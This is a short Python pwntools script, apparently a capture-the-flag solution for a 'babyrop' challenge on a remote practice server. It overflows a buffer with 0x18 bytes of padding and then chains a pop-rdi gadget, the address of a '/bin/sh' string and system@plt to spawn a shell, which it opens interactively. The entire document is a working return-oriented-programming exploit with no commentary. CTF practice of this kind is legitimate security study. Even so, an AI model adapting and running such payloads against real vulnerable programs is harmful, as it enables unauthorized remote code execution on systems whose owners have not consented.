from pwn import *
context(log_level='DEBUG')
#io = process("./babyrop")
io = remote('node3.buuoj.cn',28280)
elf = ELF('./babyrop')
io.recv()
sys_plt = elf.plt["system"]
pop_rdi_ret =0x0400683
bin_sh = 0x0601048
payload = 'a'*0x18+ p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_plt)+p64(0xdeadbeef)
io.sendline(payload)
io.interactive()